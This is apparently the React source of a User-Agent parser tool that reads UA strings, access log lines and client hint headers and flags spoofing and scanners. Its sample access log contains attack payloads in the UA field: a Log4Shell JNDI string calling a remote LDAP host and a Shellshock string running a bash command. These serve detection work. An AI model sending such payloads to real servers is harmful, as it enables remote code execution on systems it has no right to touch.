/**
 * User-Agent parser.
 *
 * Reads one UA string or a whole paste of them: bare strings, request
 * headers, or combined format access log lines, where the UA is the last
 * quoted field. Sec-CH-UA client hint headers in the same paste are parsed
 * too and checked against the UA, which is how a spoofed string usually
 * gives itself away.
 *
 * The rules live in lib/toolkit/user-agent-parser.ts. There is no device
 * database and nothing is looked up: every conclusion comes from the text.
 */

import { useEffect, useMemo, useRef, useState } from "react";
import { CopyButton } from "@/components/ui/copy-button";
import { pluralise } from "@/lib/plural";
import {
  MAX_ENTRIES,
  MAX_UA_LENGTH,
  brandListValue,
  deviceCounts,
  parseInput,
  type ClientHints,
  type DeviceType,
  type Entry,
  type Finding,
  type Token,
  type Tone,
  type UaAnalysis,
} from "@/lib/toolkit/user-agent-parser";
import { ToolPanel, ToolResult, ToolShell } from "./ToolShell";

/* ------------------------------------------------------------------ styles */

const CHIP =
  "inline-flex min-h-[44px] items-center rounded-full border border-[hsl(var(--brand-iron))] px-4 font-mono-tight text-[0.625rem] uppercase tracking-[0.18em] text-[hsl(var(--brand-ash))] transition-colors hover:border-[hsl(var(--brand-signal)/0.6)] hover:text-[hsl(var(--brand-bone))] focus-visible:outline focus-visible:outline-2 focus-visible:outline-offset-2 focus-visible:outline-[hsl(var(--brand-signal))]";
const TH =
  "py-2 pr-4 font-mono-tight text-[0.625rem] font-normal uppercase tracking-[0.28em] text-[hsl(var(--brand-ash))]";
const TH_LAST =
  "py-2 font-mono-tight text-[0.625rem] font-normal uppercase tracking-[0.28em] text-[hsl(var(--brand-ash))]";

const TONE_STYLE: Record<Tone, string> = {
  ok: "border-[hsl(var(--brand-signal)/0.45)] bg-[hsl(var(--brand-signal)/0.07)] text-[hsl(var(--brand-signal))]",
  info: "border-[hsl(var(--brand-iron))] bg-[hsl(var(--brand-obsidian)/0.4)] text-[hsl(var(--brand-bone-dim))]",
  warn: "border-[hsl(var(--brand-amber)/0.5)] bg-[hsl(var(--brand-amber)/0.08)] text-[hsl(var(--brand-amber))]",
  danger: "border-[hsl(var(--brand-danger)/0.5)] bg-[hsl(var(--brand-danger)/0.08)] text-[hsl(var(--brand-danger))]",
};

const DEVICE_LABEL: Record<DeviceType, string> = {
  desktop: "desktop",
  mobile: "mobile",
  tablet: "tablet",
  tv: "TV",
  console: "game console",
  bot: "bot or tool",
  unknown: "unknown",
};

const SOURCE_LABEL: Record<Entry["source"], string> = {
  line: "pasted string",
  header: "User-Agent header",
  log: "access log line (last quoted field)",
};

/* ---------------------------------------------------------------- examples */

const EXAMPLES: { label: string; text: string }[] = [
  {
    label: "Chrome on Windows",
    text: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
  },
  {
    label: "Safari on iPhone",
    text: "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1",
  },
  { label: "Firefox on Linux", text: "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0" },
  {
    label: "Android phone",
    text: "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/24.0 Chrome/117.0.0.0 Mobile Safari/537.36",
  },
  {
    label: "Googlebot",
    text: "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.155 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
  },
  {
    label: "Tools and scanners",
    text: [
      "curl/8.4.0",
      "python-requests/2.31.0",
      "Go-http-client/1.1",
      "sqlmap/1.7.2#stable (https://sqlmap.org)",
      "Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:Port Check)",
      "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)",
      "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/124.0.6367.60 Safari/537.36",
    ].join("\n"),
  },
  {
    label: "Access log",
    text: [
      '203.0.113.9 - - [14/Mar/2026:09:12:01 -0700] "GET / HTTP/1.1" 200 5120 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15"',
      '198.51.100.23 - - [14/Mar/2026:09:12:04 -0700] "GET /?id=1 HTTP/1.1" 200 812 "-" "${jndi:ldap://198.51.100.77:1389/Exploit}"',
      '198.51.100.40 - - [14/Mar/2026:09:12:09 -0700] "GET /cgi-bin/status HTTP/1.1" 404 196 "-" "() { :; }; /bin/bash -c \\"id\\""',
      '192.0.2.15 - - [14/Mar/2026:09:12:11 -0700] "GET /.env HTTP/1.1" 404 196 "-" "-"',
    ].join("\n"),
  },
  {
    label: "Spoofed headers",
    text: [
      "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
      'Sec-CH-UA: "Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
      "Sec-CH-UA-Mobile: ?0",
      'Sec-CH-UA-Platform: "Windows"',
      'Sec-CH-UA-Platform-Version: "15.0.0"',
    ].join("\n"),
  },
];

/* ------------------------------------------------------- client hints ref */

const HINTS_REFERENCE: { header: string; sent: string; example: string; adds: string }[] = [
  { header: "Sec-CH-UA", sent: "always", example: '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"', adds: "Brands and major versions, with a GREASE entry" },
  { header: "Sec-CH-UA-Mobile", sent: "always", example: "?0", adds: "Whether the browser wants the mobile experience" },
  { header: "Sec-CH-UA-Platform", sent: "always", example: '"Windows"', adds: "Operating system name" },
  { header: "Sec-CH-UA-Platform-Version", sent: "on request", example: '"15.0.0"', adds: "Real OS version; on Windows, 13 and above is Windows 11" },
  { header: "Sec-CH-UA-Full-Version-List", sent: "on request", example: '"Google Chrome";v="124.0.6367.91"', adds: "Full browser versions" },
  { header: "Sec-CH-UA-Model", sent: "on request", example: '"Pixel 8"', adds: "Device model, mostly on Android" },
  { header: "Sec-CH-UA-Arch", sent: "on request", example: '"x86"', adds: "CPU architecture family" },
  { header: "Sec-CH-UA-Bitness", sent: "on request", example: '"64"', adds: "32 or 64 bit" },
  { header: "Sec-CH-UA-WoW64", sent: "on request", example: "?0", adds: "A 32-bit browser on 64-bit Windows" },
];

/* ------------------------------------------------------------------ browser */

interface UaBrand {
  brand: string;
  version: string;
}
interface UaDataValues {
  platformVersion?: string;
  model?: string;
  architecture?: string;
  bitness?: string;
  wow64?: boolean;
  fullVersionList?: UaBrand[];
}
/** navigator.userAgentData, which TypeScript's DOM types do not include yet. */
interface UaData {
  brands: UaBrand[];
  mobile: boolean;
  platform: string;
  getHighEntropyValues?: (hints: string[]) => Promise<UaDataValues>;
}

function sfQuote(s: string): string {
  return `"${s.replace(/[\\"]/g, (c) => `\\${c}`)}"`;
}

/* ---------------------------------------------------------------- helpers */

function named(n: { name: string; version: string | null } | null): string {
  if (!n) return "not identified";
  return n.version ? `${n.name} ${n.version}` : n.name;
}

function flagCount(a: UaAnalysis): number {
  return a.findings.filter((f) => f.tone === "warn" || f.tone === "danger").length;
}

function worstTone(a: UaAnalysis): Tone | null {
  if (a.findings.some((f) => f.tone === "danger")) return "danger";
  if (a.findings.some((f) => f.tone === "warn")) return "warn";
  return null;
}

/* ------------------------------------------------------------------- view */

function FindingList({ items, testId }: { items: Finding[]; testId: string }) {
  return (
    <ul className="space-y-2" data-testid={testId}>
      {items.map((finding, i) => (
        <li
          key={`${i}-${finding.text.slice(0, 32)}`}
          className={`rounded-lg border p-3 font-mono-tight text-xs leading-relaxed ${TONE_STYLE[finding.tone]}`}
        >
          {finding.text}
        </li>
      ))}
    </ul>
  );
}

function TokenRow({ token }: { token: Token }) {
  const color =
    token.kind === "product"
      ? "text-[hsl(var(--brand-cyan))]"
      : token.kind === "comment"
        ? "text-[hsl(var(--brand-amber))]"
        : "text-[hsl(var(--brand-bone-dim))]";
  return (
    <li className="border-b border-[hsl(var(--brand-iron)/0.5)] py-2.5 last:border-b-0">
      <code className={`break-all font-mono-tight text-sm ${color}`}>{token.text}</code>
      <span className="ml-2 font-mono-tight text-[0.625rem] uppercase tracking-[0.24em] text-[hsl(var(--brand-ash))]">
        {token.kind}
      </span>
      {token.note ? (
        <p className="mt-1 font-mono-tight text-xs leading-relaxed text-[hsl(var(--brand-bone-dim))]">{token.note}</p>
      ) : null}
    </li>
  );
}

function EntryDetail({ entry }: { entry: Extract<Entry, { kind: "ua" }> }) {
  const a = entry.analysis;
  const extra: Finding[] = [
    ...a.reduced.map((text) => ({ tone: "info" as const, text })),
    ...(a.os?.note ? [{ tone: "info" as const, text: a.os.note }] : []),
    ...(a.tokenizerNote ? [{ tone: "info" as const, text: `Grammar: ${a.tokenizerNote}` }] : []),
  ];
  const all = [...a.findings, ...extra];

  return (
    <div className="space-y-6" data-testid="output-ua">
      <div className="grid grid-cols-1 gap-6 lg:grid-cols-2">
        <ToolPanel title={`Line ${entry.line}`}>
          <ToolResult label="Browser" value={named(a.browser)} testId="text-ua-browser" />
          <ToolResult label="Engine" value={named(a.engine)} testId="text-ua-engine" />
          <ToolResult label="Operating system" value={named(a.os)} testId="text-ua-os" />
          <ToolResult label="Architecture" value={a.arch ?? "not stated"} />
          <ToolResult label="Device type" value={DEVICE_LABEL[a.device.type]} testId="text-ua-device" />
          <ToolResult label="Device model" value={a.device.model ?? "not stated"} />
          <ToolResult
            label="Automated client"
            value={a.bot ? `${named(a.bot)} (${a.bot.kind})` : "none recognized"}
            testId="text-ua-bot"
          />
          {a.bot ? <ToolResult label="Operator" value={a.bot.operator} mono={false} /> : null}
          <ToolResult label="Read from" value={SOURCE_LABEL[entry.source]} />
          <ToolResult label="Length" value={`${a.ua.length} ${pluralise(a.ua.length, "char")}`} />
        </ToolPanel>

        <ToolPanel title="Findings">
          {all.length ? (
            <FindingList items={all} testId="list-ua-findings" />
          ) : (
            <p className="font-mono-tight text-xs leading-relaxed text-[hsl(var(--brand-bone-dim))]" data-testid="list-ua-findings">
              Nothing unusual. That only means the string is well formed: it says what the client chose to claim.
            </p>
          )}
        </ToolPanel>
      </div>

      <ToolPanel title="Tokens">
        <div className="max-h-[28rem] overflow-y-auto pr-1">
          <ul data-testid="list-ua-tokens">
            {a.tokens.map((t, i) => (
              <TokenRow key={`${i}-${t.text.slice(0, 24)}`} token={t} />
            ))}
          </ul>
        </div>
        <p className="mt-3 font-mono-tight text-xs leading-relaxed text-[hsl(var(--brand-ash))]">
          <span className="text-[hsl(var(--brand-cyan))]">Products</span> are name/version pairs,{" "}
          <span className="text-[hsl(var(--brand-amber))]">comments</span> are the parenthesized parts, as RFC 9110
          section 10.1.5 defines them.
        </p>
        <div className="mt-4 flex flex-wrap items-center gap-2">
          <pre className="min-w-0 flex-1 overflow-x-auto rounded-lg border border-[hsl(var(--brand-iron))] bg-[hsl(var(--brand-obsidian))] p-4 font-mono-tight text-xs text-[hsl(var(--brand-signal))]">
            {a.ua || "(empty)"}
          </pre>
          <CopyButton value={a.ua} label="Copy this User-Agent" testId="button-copy-ua" />
        </div>
      </ToolPanel>
    </div>
  );
}

function HintsPanel({ hints }: { hints: ClientHints }) {
  const list = hints.fullVersionList ?? hints.brands;
  return (
    <ToolPanel title="Client Hints">
      <div data-testid="output-client-hints">
        {list ? (
          <div className="overflow-x-auto">
            <table className="w-full min-w-[420px] border-collapse text-left">
              <thead>
                <tr className="border-b border-[hsl(var(--brand-iron))]">
                  <th scope="col" className={TH}>
                    Brand
                  </th>
                  <th scope="col" className={TH}>
                    Version
                  </th>
                  <th scope="col" className={TH_LAST}>
                    Note
                  </th>
                </tr>
              </thead>
              <tbody>
                {list.map((b, i) => (
                  <tr key={`${i}-${b.brand}`} className="border-b border-[hsl(var(--brand-iron)/0.5)]">
                    <th scope="row" className="py-2.5 pr-4 font-mono-tight text-sm font-normal text-[hsl(var(--brand-bone))]">
                      {b.brand}
                    </th>
                    <td className="py-2.5 pr-4 font-mono-tight text-sm text-[hsl(var(--brand-bone-dim))]">{b.version ?? "none"}</td>
                    <td className="py-2.5 font-mono-tight text-xs text-[hsl(var(--brand-ash))]">
                      {b.grease ? "GREASE, deliberately fake" : ""}
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        ) : null}
        <div className="mt-4">
          {hints.mobile !== null ? <ToolResult label="Mobile" value={hints.mobile ? "yes (?1)" : "no (?0)"} /> : null}
          {hints.platform !== null ? <ToolResult label="Platform" value={hints.platform} /> : null}
          {hints.platformVersion !== null ? <ToolResult label="Platform version" value={hints.platformVersion} /> : null}
          {hints.model !== null ? <ToolResult label="Model" value={hints.model || "empty (not a phone or tablet)"} /> : null}
          {hints.arch !== null ? <ToolResult label="Architecture" value={hints.arch} /> : null}
          {hints.bitness !== null ? <ToolResult label="Bitness" value={hints.bitness} /> : null}
          {hints.wow64 !== null ? <ToolResult label="WoW64" value={hints.wow64 ? "yes" : "no"} /> : null}
        </div>
        {hints.errors.length ? (
          <ul className="mt-4 space-y-2">
            {hints.errors.map((e) => (
              <li key={e} role="alert" className={`rounded-lg border p-3 font-mono-tight text-xs leading-relaxed ${TONE_STYLE.danger}`}>
                {e}
              </li>
            ))}
          </ul>
        ) : null}
        {hints.findings.length ? (
          <div className="mt-4">
            <FindingList items={hints.findings} testId="list-hint-findings" />
          </div>
        ) : null}
      </div>
    </ToolPanel>
  );
}

export function UserAgentParser() {
  const [raw, setRaw] = useState("");
  const [selected, setSelected] = useState(0);
  const [browserNote, setBrowserNote] = useState<string | null>(null);
  const mounted = useRef(true);
  const request = useRef(0);

  useEffect(() => {
    mounted.current = true;
    return () => {
      mounted.current = false;
    };
  }, []);

  const parsed = useMemo(() => parseInput(raw), [raw]);
  const entries = parsed.entries;
  const sel = entries.length === 0 ? -1 : Math.min(selected, entries.length - 1);
  const current = sel >= 0 ? entries[sel] : null;
  const counts = useMemo(() => deviceCounts(entries), [entries]);

  function load(text: string) {
    setRaw(text);
    setSelected(0);
    setBrowserNote(null);
  }

  /** Fills in what this browser itself sends. Everything is read locally from navigator. */
  async function fillFromThisBrowser() {
    if (typeof navigator === "undefined") return;
    const token = ++request.current;
    const lines = [`User-Agent: ${navigator.userAgent}`];
    const data = (navigator as Navigator & { userAgentData?: UaData }).userAgentData;
    if (!data || !Array.isArray(data.brands)) {
      load(lines.join("\n"));
      setBrowserNote("This browser does not expose User-Agent Client Hints, so only its User-Agent string is shown.");
      return;
    }
    lines.push(`Sec-CH-UA: ${brandListValue(data.brands)}`);
    lines.push(`Sec-CH-UA-Mobile: ?${data.mobile ? 1 : 0}`);
    lines.push(`Sec-CH-UA-Platform: ${sfQuote(data.platform)}`);
    if (typeof data.getHighEntropyValues === "function") {
      try {
        const v = await data.getHighEntropyValues([
          "platformVersion",
          "model",
          "architecture",
          "bitness",
          "wow64",
          "fullVersionList",
        ]);
        if (Array.isArray(v.fullVersionList)) lines.push(`Sec-CH-UA-Full-Version-List: ${brandListValue(v.fullVersionList)}`);
        if (typeof v.platformVersion === "string") lines.push(`Sec-CH-UA-Platform-Version: ${sfQuote(v.platformVersion)}`);
        if (typeof v.model === "string") lines.push(`Sec-CH-UA-Model: ${sfQuote(v.model)}`);
        if (typeof v.architecture === "string") lines.push(`Sec-CH-UA-Arch: ${sfQuote(v.architecture)}`);
        if (typeof v.bitness === "string") lines.push(`Sec-CH-UA-Bitness: ${sfQuote(v.bitness)}`);
        if (typeof v.wow64 === "boolean") lines.push(`Sec-CH-UA-WoW64: ?${v.wow64 ? 1 : 0}`);
      } catch {
        // The browser may refuse high-entropy values. The low-entropy ones are enough to show.
      }
    }
    if (!mounted.current || token !== request.current) return;
    load(lines.join("\n"));
    setBrowserNote(
      "Read from navigator in this tab. A real request carries only the first three hints unless the server asks for the rest with Accept-CH.",
    );
  }

  const uaCount = entries.filter((e) => e.kind === "ua").length;
  const errCount = entries.length - uaCount;
  const breakdown = (Object.keys(counts) as DeviceType[])
    .filter((k) => counts[k] > 0)
    .map((k) => `${counts[k]} ${DEVICE_LABEL[k]}`)
    .join(", ");

  const summary = parsed.error
    ? "Nothing parsed."
    : entries.length === 0 && !parsed.hints
      ? "Paste a User-Agent to parse it."
      : [
          uaCount ? `${uaCount} ${pluralise(uaCount, "string")} parsed${breakdown ? `: ${breakdown}` : ""}` : null,
          errCount ? `${errCount} skipped as too long` : null,
          parsed.hints ? `${parsed.hints.headers.length} client ${pluralise(parsed.hints.headers.length, "hint")}` : null,
          parsed.ignored ? `${parsed.ignored} other ${pluralise(parsed.ignored, "line")} ignored` : null,
          parsed.truncated ? `${parsed.truncated} beyond the first ${MAX_ENTRIES} not read` : null,
        ]
          .filter(Boolean)
          .join(". ") + ".";

  return (
    <ToolShell slug="user-agent-parser">
      <div className="space-y-6">
        <ToolPanel title="User-Agent strings">
          <label htmlFor="ua-input" className="block font-mono-tight text-sm text-[hsl(var(--brand-bone-dim))]">
            Paste one or more, one per line. Request headers and access log lines work too.
          </label>
          <textarea
            id="ua-input"
            value={raw}
            onChange={(event) => load(event.target.value)}
            rows={6}
            spellCheck={false}
            autoComplete="off"
            autoCapitalize="off"
            autoCorrect="off"
            aria-invalid={parsed.error !== null}
            aria-describedby={parsed.error ? "ua-error" : "ua-hint"}
            placeholder="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
            data-testid="input-ua"
            className="mt-3 w-full resize-y break-all rounded-lg border border-[hsl(var(--brand-iron))] bg-[hsl(var(--brand-obsidian)/0.6)] px-4 py-3 font-mono-tight text-xs leading-relaxed text-[hsl(var(--brand-bone))] placeholder:text-[hsl(var(--brand-ash))] focus:border-[hsl(var(--brand-signal))] focus:outline-none"
          />
          {parsed.error ? (
            <p
              id="ua-error"
              role="alert"
              data-testid="text-ua-error"
              className="mt-3 rounded-lg border border-[hsl(var(--brand-danger)/0.5)] bg-[hsl(var(--brand-danger)/0.08)] p-3 font-mono-tight text-xs leading-relaxed text-[hsl(var(--brand-danger))]"
            >
              {parsed.error}
            </p>
          ) : (
            <p id="ua-hint" className="mt-3 font-mono-tight text-xs leading-relaxed text-[hsl(var(--brand-ash))]">
              User-Agent: and Sec-CH-UA lines are read from a header block and other headers are skipped. In a combined
              format log line the last quoted field is taken. Up to {MAX_ENTRIES} strings of up to {MAX_UA_LENGTH}{" "}
              characters each.
            </p>
          )}
          {browserNote ? (
            <p className="mt-2 font-mono-tight text-xs leading-relaxed text-[hsl(var(--brand-bone-dim))]" data-testid="text-browser-note">
              {browserNote}
            </p>
          ) : null}

          <div className="mt-4 flex flex-wrap items-center gap-2">
            <span className="font-mono-tight text-[0.625rem] uppercase tracking-[0.24em] text-[hsl(var(--brand-ash))]">
              Try
            </span>
            <button type="button" onClick={() => void fillFromThisBrowser()} data-testid="button-this-browser" className={CHIP}>
              This browser
            </button>
            {EXAMPLES.map((example) => (
              <button
                key={example.label}
                type="button"
                onClick={() => load(example.text)}
                data-testid={`button-example-${example.label.toLowerCase().replace(/[^a-z0-9]+/g, "-")}`}
                className={CHIP}
              >
                {example.label}
              </button>
            ))}
            {raw ? (
              <button type="button" onClick={() => load("")} data-testid="button-clear" className={CHIP}>
                Clear
              </button>
            ) : null}
          </div>
        </ToolPanel>

        <div className="rounded-2xl border border-[hsl(var(--brand-amber)/0.5)] bg-[hsl(var(--brand-amber)/0.07)] p-5">
          <div className="font-mono-tight text-[0.625rem] uppercase tracking-[0.28em] text-[hsl(var(--brand-amber))]">
            Every field is a claim
          </div>
          <p className="mt-2 font-mono-tight text-sm leading-relaxed text-[hsl(var(--brand-bone-dim))]">
            The User-Agent is a header the client writes about itself. One curl flag or a browser setting replaces it,
            so this page reports what a request said, never what sent it. Use it to sort traffic and spot defaults left
            unchanged, and confirm anything that matters from the network side.
          </p>
        </div>

        <p
          role="status"
          aria-live="polite"
          data-testid="text-summary"
          className="font-mono-tight text-xs uppercase tracking-[0.24em] text-[hsl(var(--brand-ash))]"
        >
          {summary}
        </p>

        {entries.length > 1 ? (
          <ToolPanel title="All entries">
            <div className="max-h-[32rem] overflow-auto">
              <table className="w-full min-w-[720px] border-collapse text-left" data-testid="table-ua-entries">
                <thead>
                  <tr className="border-b border-[hsl(var(--brand-iron))]">
                    <th scope="col" className={TH}>
                      Line
                    </th>
                    <th scope="col" className={TH}>
                      Browser or client
                    </th>
                    <th scope="col" className={TH}>
                      OS
                    </th>
                    <th scope="col" className={TH}>
                      Device
                    </th>
                    <th scope="col" className={TH_LAST}>
                      Flags
                    </th>
                  </tr>
                </thead>
                <tbody>
                  {entries.map((e, i) => {
                    const a = e.kind === "ua" ? e.analysis : null;
                    const tone = a ? worstTone(a) : "danger";
                    const flags = a ? flagCount(a) : 0;
                    return (
                      <tr
                        key={`${e.line}-${i}`}
                        className={`border-b border-[hsl(var(--brand-iron)/0.5)] align-top ${i === sel ? "bg-[hsl(var(--brand-signal)/0.06)]" : ""}`}
                      >
                        <td className="py-2 pr-4 font-mono-tight text-xs text-[hsl(var(--brand-ash))]">{e.line}</td>
                        <td className="py-2 pr-4">
                          <button
                            type="button"
                            onClick={() => setSelected(i)}
                            aria-pressed={i === sel}
                            data-testid={`button-select-entry-${i}`}
                            className="min-h-[24px] text-left font-mono-tight text-xs text-[hsl(var(--brand-bone))] underline-offset-2 hover:underline focus-visible:outline focus-visible:outline-2 focus-visible:outline-offset-2 focus-visible:outline-[hsl(var(--brand-signal))]"
                          >
                            {a ? (a.bot ? named(a.bot) : named(a.browser)) : "too long, skipped"}
                          </button>
                        </td>
                        <td className="py-2 pr-4 font-mono-tight text-xs text-[hsl(var(--brand-bone-dim))]">
                          {a?.os ? named(a.os) : ""}
                        </td>
                        <td className="py-2 pr-4 font-mono-tight text-xs text-[hsl(var(--brand-bone-dim))]">
                          {a ? DEVICE_LABEL[a.device.type] : ""}
                        </td>
                        <td
                          className={`py-2 font-mono-tight text-xs ${
                            tone === "danger"
                              ? "text-[hsl(var(--brand-danger))]"
                              : tone === "warn"
                                ? "text-[hsl(var(--brand-amber))]"
                                : "text-[hsl(var(--brand-ash))]"
                          }`}
                        >
                          {a ? (flags ? `${flags} ${pluralise(flags, "flag")}` : "none") : "error"}
                        </td>
                      </tr>
                    );
                  })}
                </tbody>
              </table>
            </div>
          </ToolPanel>
        ) : null}

        {current ? (
          current.kind === "error" ? (
            <p
              role="alert"
              data-testid="text-entry-error"
              className="rounded-lg border border-[hsl(var(--brand-danger)/0.5)] bg-[hsl(var(--brand-danger)/0.08)] p-3 font-mono-tight text-xs leading-relaxed text-[hsl(var(--brand-danger))]"
            >
              Line {current.line}: {current.message}
            </p>
          ) : (
            <EntryDetail entry={current} />
          )
        ) : null}

        {parsed.hints ? <HintsPanel hints={parsed.hints} /> : null}

        <ToolPanel title="User-Agent Client Hints">
          <p className="font-mono-tight text-xs leading-relaxed text-[hsl(var(--brand-bone-dim))]">
            Chromium browsers also describe themselves in structured Sec-CH-UA headers. Three are sent on every HTTPS
            request; the rest only after the server asks with an Accept-CH response header. Firefox and Safari do not
            send them.
          </p>
          <div className="mt-4 overflow-x-auto">
            <table className="w-full min-w-[640px] border-collapse text-left">
              <thead>
                <tr className="border-b border-[hsl(var(--brand-iron))]">
                  <th scope="col" className={TH}>
                    Header
                  </th>
                  <th scope="col" className={TH}>
                    Sent
                  </th>
                  <th scope="col" className={TH}>
                    Example
                  </th>
                  <th scope="col" className={TH_LAST}>
                    Adds
                  </th>
                </tr>
              </thead>
              <tbody>
                {HINTS_REFERENCE.map((h) => (
                  <tr key={h.header} className="border-b border-[hsl(var(--brand-iron)/0.5)] align-top">
                    <th scope="row" className="whitespace-nowrap py-2.5 pr-4 font-mono-tight text-xs font-normal text-[hsl(var(--brand-signal))]">
                      {h.header}
                    </th>
                    <td className="whitespace-nowrap py-2.5 pr-4 font-mono-tight text-xs text-[hsl(var(--brand-bone-dim))]">{h.sent}</td>
                    <td className="max-w-[260px] break-all py-2.5 pr-4 font-mono-tight text-xs text-[hsl(var(--brand-bone))]">
                      {h.example}
                    </td>
                    <td className="py-2.5 font-mono-tight text-xs leading-relaxed text-[hsl(var(--brand-ash))]">{h.adds}</td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        </ToolPanel>
      </div>
    </ToolShell>
  );
}
